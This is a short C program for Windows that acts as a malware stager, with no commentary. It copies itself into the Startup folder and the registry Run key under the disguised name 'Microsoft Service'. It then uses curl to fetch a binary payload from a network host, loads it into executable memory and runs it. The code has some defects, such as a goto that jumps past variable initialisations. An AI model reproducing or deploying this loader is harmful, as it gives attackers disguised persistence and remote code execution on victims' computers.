#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>  

void copyToStartup(char *sourcePath, char *destinationPath) {
    CopyFile(sourcePath, destinationPath, FALSE);
}

int bootRun() {
    TCHAR szPath[MAX_PATH];
    DWORD pathLen = 0;

    pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (pathLen == 0) {
        return -1;
    }

    char startupPath[MAX_PATH];
    if (!SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        return -1;
    }

    char destination[MAX_PATH];
    snprintf(destination, MAX_PATH, "%s\\MicrosoftService.exe", startupPath);

    copyToStartup(szPath, destination);

    HKEY NewVal;
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        return -1;
    }

    DWORD pathLenInBytes = strlen(destination) + 1;
    if (RegSetValueEx(NewVal, TEXT("Microsoft Service"), 0, REG_SZ, (LPBYTE)destination, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        return -1;
    }

    RegCloseKey(NewVal);
    return 0;
}

int main() {
    bootRun();

    start:
    FILE *(*f1)(const char *, const char *) = popen;
    size_t (*f2)(void *, size_t, size_t, FILE *) = fread;
    int (*f3)(FILE *) = pclose;
    void *(*f4)(LPVOID, SIZE_T, DWORD, DWORD) = VirtualAlloc;
    void *(*f5)(void *, const void *, size_t) = memcpy;

    FILE *fpipe;
    char *command = "curl http://192.168.1.1:8080/code.bin";
    char c = 0;
    unsigned char code[460];
    int counter = 0;

    while(0 == (fpipe = (FILE*)f1(command, "r"))) {
        Sleep(10);
        goto start;
    }

    while (f2(&c, sizeof c, 1, fpipe)) {
        code[counter] = c;
        counter++;
    }

    f3(fpipe);

    void *exec = f4(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    f5(exec, code, sizeof code);

    ((void(*)())exec)();

    return 0;
}
